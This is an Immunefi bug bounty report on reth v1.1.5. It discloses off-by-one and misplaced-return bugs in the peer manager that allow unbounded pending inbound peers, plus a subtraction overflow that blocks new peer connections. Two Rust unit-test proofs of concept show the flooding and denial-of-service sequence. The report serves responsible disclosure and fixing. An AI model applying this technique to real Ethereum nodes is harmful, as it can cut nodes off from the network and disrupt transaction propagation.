# #38686 \[BC-Low] Nodes with trusted peers vulnerable to pending peer flooding and DoS

**Submitted on Jan 10th 2025 at 04:18:26 UTC by @Blobism for** [**Attackathon | Ethereum Protocol**](https://immunefi.com/audit-competition/ethereum-protocol-attackathon)

* **Report ID:** #38686
* **Report Type:** Blockchain/DLT
* **Report severity:** Low
* **Target:** <https://github.com/paradigmxyz/reth>
* **Impacts:**
  * Shutdown of less than 10% of network processing nodes without brute force actions, but does not shut down the network
  * Increasing less than 25% of network processing node resource consumption by at least 30% without brute force actions, compared to the preceding 24 hours
  * Causing less than 25% of network processing nodes to process transactions from the mempool beyond set parameters (e.g. prevents processing transactions from the mempool)

## Description

## Brief/Intro

The latest `reth` release (`v1.1.5`) contains a peer management vulnerability which allows both unlimited pending peers and DoS attacks which disable the connection of new peers. These attacks can be carried out on any `reth` node with trusted peers. The unlimited peers issue results from the peer manager allowing in new pending connections even after pending limits are exceeded. The DoS attack comes from disconnecting pending peers which have exceeded this limit, leading to a subtraction overflow which results in the pending limit being permanently exceeded.

## Vulnerability Details

### Unlimited Pending Peers

The vulnerability is found in `crates/net/network/src/peers.rs`, in the function `on_incoming_pending_session`. The primary bug is found on these lines:

```rust
if self.connection_info.num_pending_in <= max_inbound {
    self.connection_info.inc_pending_in();
}
return Ok(())
```

The return should be inside of the `if` block. Due to it being after the `if` block, this code path will allow unlimited pending peers through, even when `num_pending_in` has exceeded `max_inbound`. Additionally, the `<=` check here should be a `<` check, as it is currently allowing in pending connections 1 beyond `max_inbound`.

To reach this point in the code, the number of established peer connections needs to have reached its maximum. The node must have at least 1 trusted peer, but it does not matter if that peer is connected or not. This is due to an additional bug in the following line:

```rust
if num_idle_trusted_peers <= self.trusted_peer_ids.len() {
```

The check here should be `<`. This check is meant to allow in pending peers in case one of the node's trusted peers is not yet connected. However, this check currently will return `True` even when all trusted peers are connected, due to the check being `<=`. This expands the impact of the primary bug, because it makes it easier to reach the code which allows for unlimited pending peers to be allowed through.

### Peer Connection DoS

Let us look at the lines of code with the primary bug once again:

```rust
if self.connection_info.num_pending_in <= max_inbound {
    self.connection_info.inc_pending_in();
}
return Ok(())
```

Observe that this **always** allows a pending connection to be created, but it only increments `num_pending_in` if the value is within bounds. This means that if the bounds are exceeded, a pending connection will be created, but `num_pending_in` will not be incremented to reflect this, under-counting the number of pending connections.

Now consider what happens if the pending bounds are exceeded and all of these pending connections are closed. Depending on how these pending connections are closed, many different functions could be called in the peer manager (`on_incoming_pending_session_dropped` for example), but all of these pending session close functions will call `self.connection_info.decr_pending_in()`. The function `decr_pending_in` then does a decrement:

```rust
fn decr_pending_in(&mut self) {
    self.num_pending_in -= 1;
}
```

This will overflow because the number of actual pending connections which are getting closed will exceed the value of `num_pending_in`. Now, we will have an extremely large `num_pending_in`. The DoS comes from the fact that if an established connection is now closed, the overflow will permanently prevent new pending connections due to this check in `on_incoming_pending_session`:

```rust
if !self.connection_info.has_in_pending_capacity() {
    return Err(InboundConnectionError::ExceedsCapacity)
}
```

The `on_incoming_pending_session` function is shown below with bugs noted in comments:

```rust
pub(crate) fn on_incoming_pending_session(
    &mut self,
    addr: IpAddr,
) -> Result<(), InboundConnectionError> {
    if self.ban_list.is_banned_ip(&addr) {
        return Err(InboundConnectionError::IpBanned)
    }

    // check if we even have slots for a new incoming connection
    if !self.connection_info.has_in_capacity() {
        if self.trusted_peer_ids.is_empty() {
            // if we don't have any incoming slots and no trusted peers, we don't accept any new
            // connections
            return Err(InboundConnectionError::ExceedsCapacity)
        }

        // there's an edge case here where no incoming connections besides from trusted peers
        // are allowed (max_inbound == 0), in which case we still need to allow new pending
        // incoming connections until all trusted peers are connected.
        let num_idle_trusted_peers = self.num_idle_trusted_peers();
        if num_idle_trusted_peers <= self.trusted_peer_ids.len() { // <------- BUG: should be <
            // we still want to limit concurrent pending connections
            let max_inbound =
                self.trusted_peer_ids.len().max(self.connection_info.config.max_inbound);
            if self.connection_info.num_pending_in <= max_inbound { // <------ BUG: should be <
                self.connection_info.inc_pending_in();
            }
            return Ok(()) // <-------------------- BUG: should be in the above if block
        }

        // all trusted peers are either connected or connecting
        return Err(InboundConnectionError::ExceedsCapacity)
    }

    // also cap the incoming connections we can process at once
    if !self.connection_info.has_in_pending_capacity() {
        return Err(InboundConnectionError::ExceedsCapacity)
    }

    // apply the rate limit
    self.throttle_incoming_ip(addr);

    self.connection_info.inc_pending_in();
    Ok(())
}
```

## Impact Details

This exploit allows an attacker to flood a `reth` node with pending peers, beyond the set limits of the node. Additionally, new peers can easily be prevented from connecting to this node by exploiting the primary bug. The node remains connected to its current peers when this happens, which could enable a strategic network partition by an attacker.

The percentage of `reth` execution nodes is 2% according to `clientdiversity.org`. Additionally, the node must have at least one trusted peer for this exploit to be possible. Therefore, this is a Low vulnerability bug that falls into the following categories:

* "Shutdown of less than 10% of network processing nodes without brute force actions, but does not shut down the network" - With a debug build, a node would truly panic and shut down due to the subtraction overflow exploit. With a release build, no new incoming peers will be accepted, so this processing node could potentially no longer propagate or receive new transactions.
* "Causing less than 25% of network processing nodes to process transactions from the mempool beyond set parameters (e.g. prevents processing transactions from the mempool)" - This exploit falls in this category in the sense that the mempool will no longer contain transactions that it would normally have, because the DoS attack can cut it off from peers.
* "Increasing less than 25% of network processing node resource consumption by at least 30% without brute force actions, compared to the preceding 24 hours" - Flooding a node with pending peers could achieve this due to the unlimited pending peer bug.

## References

<https://github.com/paradigmxyz/reth/blob/v1.1.5/crates/net/network/src/peers.rs>

## Link to Proof of Concept

<https://gist.github.com/knagaitsev/bdea312e684670632dea829244dad9b1>

## Proof of Concept

## Proof of Concept

I believe that unit tests are sufficient in demonstrating the severity of these exploits. Integration or private testnet PoCs can be provided if needed. There are 2 versions of the exploit demonstrated, to show that the exploit can work regardless of the state of the trusted peer:

1. Awaiting Trusted Peers - In this case we are awaiting the connection of a trusted peer, so it is expected behavior that pending connections will be allowed in even when established connections have reached their max.
2. Trusted Peers Connected - In this case all trusted peers have established connections. Pending connections are still allowed in due to one of the bugs described above.

In both cases we show how pending peers are allowed beyond the limit, then how the DoS attack can occur to prevent new pending peers. These PoC unit tests should be added to `crates/net/network/src/peers.rs`

### Unit PoC 1: Awaiting Trusted Peers

This PoC uses the following procedure:

1. Add a trusted peer, but do not connect it
2. fill established inbound slots with untrusted peers
3. Saturate the pending inbound slots, which is allowed since the trusted peer has not connected
4. Add pending inbound connections beyond the limit (this is where a flooding exploit could occur)
5. Drop all of these pending connections (subtraction overflow occurs here)
6. Disconnect one of the established peers
7. Observe that any new incoming pending peers are rejected, when they should be allowed through

```rust
#[tokio::test]
async fn awaiting_trusted_peers_bug() {
    let mut peers = PeersManager::new(PeersConfig::test().with_max_inbound(2));
    let trusted_peer_id = PeerId::random();
    peers.add_trusted_peer_id(trusted_peer_id);

    // saturate the established inbound slots with untrusted peers (do not include trusted peer)
    let mut connected_peer_ids = Vec::new();
    for i in 0..peers.connection_info.config.max_inbound {
        let addr = SocketAddr::new(IpAddr::V4(Ipv4Addr::new(127, 0, 1, i as u8)), 8008);
        assert!(peers.on_incoming_pending_session(addr.ip()).is_ok());
        let peer_id = PeerId::random();
        peers.on_incoming_session_established(peer_id, addr);
        connected_peer_ids.push(peer_id);

        match event!(peers) {
            PeerAction::PeerAdded(id) => {
                assert_eq!(id, peer_id);
            }
            _ => unreachable!(),
        }
    }

    let mut pending_addrs = Vec::new();

    // saturate the pending slots with untrusted peers
    // Based on my interpretation of the desired behavior, pending sessions should be accepted up
    // to the max_inbound limit, as we are still waiting for the trusted peer
    for i in 0..peers.connection_info.config.max_inbound {
        let socket_addr = SocketAddr::new(IpAddr::V4(Ipv4Addr::new(127, 0, 1, (i + 10) as u8)), 8008);
        assert!(peers.on_incoming_pending_session(socket_addr.ip()).is_ok());
        pending_addrs.push(socket_addr);
    }

    // try to connect more untrusted peers: this is where pending connection flooding is possible,
    // because any number of connections can be made here without getting any rejections
    for i in 0..4 {
        let socket_addr = SocketAddr::new(IpAddr::V4(Ipv4Addr::new(127, 0, 1, (i + 20) as u8)), 8008);
        // TODO: a correct unit test should assert that these are rejected, since the pending limit
        // should be reached by now
        // However, we will not make this assertion now in order to demonstrate the full exploit
        peers.on_incoming_pending_session(socket_addr.ip()).unwrap();

        pending_addrs.push(socket_addr);
    }

    let err = PendingSessionHandshakeError::Eth(EthStreamError::P2PStreamError(
        P2PStreamError::HandshakeError(P2PHandshakeError::Disconnected(
            DisconnectReason::UselessPeer,
        )),
    ));

    // Remove ALL pending peers
    // For a debug build this will panic due to subtraction overflow
    for pending_addr in pending_addrs {
        peers.on_incoming_pending_session_dropped(pending_addr, &err);
    }
    
    // For a release build we will now have an overflown num_pending_in
    // TODO: a correct unit test should assert this is zero, but we will proceed
    // to demonstrate the full exploit
    println!("num_pending_in: {}", peers.connection_info.num_pending_in);

    println!("num_inbound: {}, has_in_capacity: {}", peers.connection_info.num_inbound, peers.connection_info.has_in_capacity());

    // Now we disconnect one of the established sessions, so a pending session
    // *should* be able to connect. However, the overflow will instead lead to a DoS
    // because num_pending_in is far too large

    peers.on_active_session_gracefully_closed(connected_peer_ids[0]);

    println!("num_inbound: {}, has_in_capacity: {}", peers.connection_info.num_inbound, peers.connection_info.has_in_capacity());

    let socket_addr = SocketAddr::new(IpAddr::V4(Ipv4Addr::new(127, 0, 1, 99)), 8008);
    // This assertion would not fail if things were working correctly
    assert!(peers.on_incoming_pending_session(socket_addr.ip()).is_ok());
}
```

We expect the debug build to have an early subtraction overflow panic:

```bash
cargo test --package reth-network --lib -- peers::tests::awaiting_trusted_peers_bug --exact --show-output
```

The release build shows the final DoS attack, as it rejects a pending connection that should be allowed:

```bash
cargo test --package reth-network --lib --release -- peers::tests::awaiting_trusted_peers_bug --exact --show-output
```

### Unit PoC 2: Trusted Peers Connected

This PoC uses the following procedure (very similar to the previous):

1. Add a trusted peer and establish its connection
2. Fill remaining established inbound slots with untrusted peers
3. Add pending inbound connections (This is where a flooding exploit could occur. Note that correct behavior would be to reject all of these connections, since established inbound slots are full AND one of those is our trusted peer)
4. Drop all of these pending connections (subtraction overflow occurs here)
5. Disconnect one of the untrusted established peers
6. Observe that any new incoming pending peers are rejected, when they should be allowed through

```rust
#[tokio::test]
async fn trusted_peers_connected_bug() {
    let mut peers = PeersManager::new(PeersConfig::test().with_max_inbound(2));
    let trusted = PeerId::random();
    peers.add_trusted_peer_id(trusted);

    // connect the trusted peer
    let addr = SocketAddr::new(IpAddr::V4(Ipv4Addr::new(127, 0, 1, 0)), 8008);
    assert!(peers.on_incoming_pending_session(addr.ip()).is_ok());
    peers.on_incoming_session_established(trusted, addr);

    match event!(peers) {
        PeerAction::PeerAdded(id) => {
            assert_eq!(id, trusted);
        }
        _ => unreachable!(),
    }

    // saturate the remaining inbound slots with untrusted peers
    let mut connected_untrusted_peer_ids = Vec::new();
    for i in 0..(peers.connection_info.config.max_inbound - 1) {
        let addr = SocketAddr::new(IpAddr::V4(Ipv4Addr::new(127, 0, 1, (i + 1) as u8)), 8008);
        assert!(peers.on_incoming_pending_session(addr.ip()).is_ok());
        let peer_id = PeerId::random();
        peers.on_incoming_session_established(peer_id, addr);
        connected_untrusted_peer_ids.push(peer_id);

        match event!(peers) {
            PeerAction::PeerAdded(id) => {
                assert_eq!(id, peer_id);
            }
            _ => unreachable!(),
        }
    }

    let mut pending_addrs = Vec::new();

    // try to connect untrusted peers: this is where pending connection flooding is possible,
    // because any number of connections can be made here without getting any rejections
    for i in 0..4 {
        let socket_addr = SocketAddr::new(IpAddr::V4(Ipv4Addr::new(127, 0, 1, (i + 10) as u8)), 8008);
        // TODO: a correct unit test should assert that these are rejected, since all of
        // our trusted peers are connected and max inbound is full
        // However, we will not make this assertion now in order to demonstrate the full exploit
        peers.on_incoming_pending_session(socket_addr.ip()).unwrap();

        pending_addrs.push(socket_addr);
    }

    let err = PendingSessionHandshakeError::Eth(EthStreamError::P2PStreamError(
        P2PStreamError::HandshakeError(P2PHandshakeError::Disconnected(
            DisconnectReason::UselessPeer,
        )),
    ));

    // Remove all pending peers
    // For a debug build this will panic due to subtraction overflow
    for pending_addr in pending_addrs {
        peers.on_incoming_pending_session_dropped(pending_addr, &err);
    }
    
    // For a release build we will now have an overflown num_pending_in
    // TODO: a correct unit test should assert this is zero, but we will proceed
    // to demonstrate the full exploit
    println!("num_pending_in: {}", peers.connection_info.num_pending_in);

    println!("num_inbound: {}, has_in_capacity: {}", peers.connection_info.num_inbound, peers.connection_info.has_in_capacity());

    // Now we disconnect one of the established sessions, so a pending session
    // *should* be able to connect. However, the overflow will instead lead to a DoS
    // because num_pending_in is far too large

    peers.on_active_session_gracefully_closed(connected_untrusted_peer_ids[0]);

    println!("num_inbound: {}, has_in_capacity: {}", peers.connection_info.num_inbound, peers.connection_info.has_in_capacity());

    let socket_addr = SocketAddr::new(IpAddr::V4(Ipv4Addr::new(127, 0, 1, 99)), 8008);
    // This assertion would not fail if things were working correctly
    assert!(peers.on_incoming_pending_session(socket_addr.ip()).is_ok());
}
```

We expect the debug build to have an early subtraction overflow panic:

```bash
cargo test --package reth-network --lib -- peers::tests::trusted_peers_connected_bug --exact --show-output
```

The release build shows the final DoS attack, as it rejects a pending connection that should be allowed:

```bash
cargo test --package reth-network --lib --release -- peers::tests::trusted_peers_connected_bug --exact --show-output
```
